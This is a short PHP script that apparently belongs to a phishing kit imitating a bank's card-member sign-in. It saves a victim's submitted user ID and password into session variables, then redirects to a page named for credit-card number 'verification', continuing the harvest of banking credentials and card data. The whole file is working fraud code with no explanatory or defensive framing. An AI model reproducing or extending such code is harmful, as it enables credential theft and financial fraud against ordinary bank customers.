<?php
session_start();
$_SESSION['mizzoow_login'] = $_POST['userID'];
$_SESSION['mizzoow_pass']  = $_POST['password'];


header("Location: ccnumberverfi.php?section=cardmembersvcs/loginlogout/app/signin");

?>